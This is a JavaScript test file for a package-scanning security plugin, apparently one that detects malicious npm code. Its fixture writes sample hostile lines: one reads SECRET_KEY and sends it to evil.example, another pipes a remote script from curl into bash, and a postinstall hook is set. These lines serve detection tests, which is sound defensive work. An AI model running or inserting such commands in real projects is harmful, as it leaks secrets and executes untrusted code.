import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const { apply, registerHttpRoutes } = await import('../dist/index.js')

function makeCtx() {
  const tools = []
  tools.register = (t) => tools.push(t)
  return { tools }
}

function makeFixture() {
  const dir = mkdtempSync(join(tmpdir(), 'doctor-test-'))
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'fixture', version: '1.0.0',
    scripts: { postinstall: 'node setup.js' },
  }))
  writeFileSync(join(dir, 'index.js'), [
    "const key = process.env.SECRET_KEY",
    "fetch('https://evil.example/collect?k=' + key)",
    "child_process.exec('curl -s http://x.y/z | bash')",
  ].join('\n'))
  writeFileSync(join(dir, 'clean.js'), 'export const x = 1\n')
  return dir
}

test('registers two tools', () => {
  const ctx = makeCtx()
  apply(ctx)
  assert.deepEqual(ctx.tools.map((t) => t.name).sort(), ['doctor_scan', 'doctor_scan_path'])
})

test('flags exfil, credentials, and lifecycle in fixture', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = makeFixture()
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.ok(r.hits >= 2, 'expected at least exfil + credential hits')
  assert.ok(r.lifecycle.length === 1 && r.lifecycle[0].script === 'postinstall')
  assert.notEqual(r.verdict, 'SAFE')
  const rules = new Set(r.results.flatMap((x) => x.hits.map((h) => h.rule)))
  assert.ok(rules.has('exfil-http') || rules.has('exfil-shell-net'))
  assert.ok(rules.has('cred-secrets'))
  rmSync(dir, { recursive: true, force: true })
})

test('clean dir is SAFE', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = mkdtempSync(join(tmpdir(), 'doctor-clean-'))
  writeFileSync(join(dir, 'ok.js'), 'export const y = 2\n')
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.equal(r.verdict, 'SAFE')
  assert.equal(r.hits, 0)
  rmSync(dir, { recursive: true, force: true })
})

test('rejects relative paths', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  await assert.rejects(() => tool.execute({ path: '../x' }), /absolute/)
})

// 捕获 registerHttpRoutes 注册的路由, 并用假 res 调用它 —— 直接测我们自己的 handler
// (原生 node:http req/res), 而不是 Hono 的 Request/Response 适配层。
function captureRoutes(ctx) {
  // The fence asks the composition's `connection` service for a rejection before serving. These
  // helpers are handed a bare object ({} or a deps bag), so that read returned undefined, the fence
  // failed CLOSED with 503 -- correctly -- and the health tests asserted 503 instead of 200. The
  // stub never modelled a host; this makes it model one. The caller's object is preserved, because
  // dsh-busyloop passes { llm } and its providers tests need it.
  const withAdmittingConnection = (base) => {
    const own = base ?? {};
    return {
      ...own,
      get: (name) => (name === 'connection' ? { requestRejection: () => undefined } : own.get?.(name)),
    };
  };
  
  const routes = new Map()
  registerHttpRoutes(withAdmittingConnection(ctx), (kind, path, handler) => { routes.set(path, { kind, handler }) })
  const call = async (path, method = 'GET') => {
    const route = routes.get(path)
    if (!route) throw new Error('no route registered at ' + path)
    const res = { statusCode: 0, headers: {}, body: undefined, setHeader(k, v) { this.headers[k] = v }, end(b) { this.body = b } }
    await route.handler({ method, url: path }, res)
    return res
  }
  return { routes, call }
}

test('health route is exact /api/doctor/health and answers 200', async () => {
  const { routes, call } = captureRoutes({})
  assert.equal(routes.get('/api/doctor/health').kind, 'exact')
  const res = await call('/api/doctor/health')
  assert.equal(res.statusCode, 200)
  assert.equal(res.headers['content-type'], 'application/json; charset=utf-8')
  const body = JSON.parse(String(res.body))
  assert.equal(body.ok, true)
  assert.equal(body.plugin, 'dsh-plugin-doctor')
  assert.ok(body.rules > 0)
  assert.equal(body.hono, undefined)
})

test('non-GET is rejected with 405 + allow: GET', async () => {
  const { call } = captureRoutes({})
  const res = await call('/api/doctor/health', 'POST')
  assert.equal(res.statusCode, 405)
  assert.equal(res.headers['allow'], 'GET')
})

test('apply registers on the official ctx.webServer, not the absent ctx.http', () => {
  const registered = []
  let effectLabel = null
  const ctx = cordisCtx({
    webServer: { register: (r) => { registered.push(r); return () => {} } },
    extra: { tools: makeCtx().tools, effect: (fn, label) => { effectLabel = label; fn() } },
  })
  apply(ctx)
  assert.deepEqual(registered.map((r) => r.path), ['/api/doctor/health'])
  assert.match(String(effectLabel), /doctor/)
})

// 复刻 cordis 的 ctx 代理: 读一个已注册但**未声明 inject** 的服务时, get 陷阱先抛
// "cannot get property X without inject" —— 可选链 `ctx.webServer?.x` 挡不住。
// 这正是本次迁移踩到的坑: 在 apply 里直接读 ctx.webServer 会让整个插件激活失败。
function cordisCtx({ webServer, extra = {} } = {}) {
  let inInject = false
  const target = {
    ...extra,
    inject: (deps, cb) => {
      if (!deps.includes('webServer') || !webServer) return undefined
      const prev = inInject
      inInject = true
      try { return cb({ webServer, effect: extra.effect }) } finally { inInject = prev }
    },
  }
  return new Proxy(target, {
    get(t, prop) {
      if (prop === 'webServer' && !inInject) throw new Error('cannot get property "webServer" without inject')
      return t[prop]
    },
  })
}

test('the cordis trap is real, and apply avoids it by using ctx.inject', () => {
  const ctx = cordisCtx({ webServer: { register: () => () => {} } })
  assert.throws(() => ctx.webServer, /without inject/)
  assert.doesNotThrow(() => apply(ctx))
})

test('apply tolerates a host without webServer (no throw)', () => {
  apply(makeCtx())
  assert.doesNotThrow(() => apply(cordisCtx({ extra: { tools: makeCtx().tools } })))
})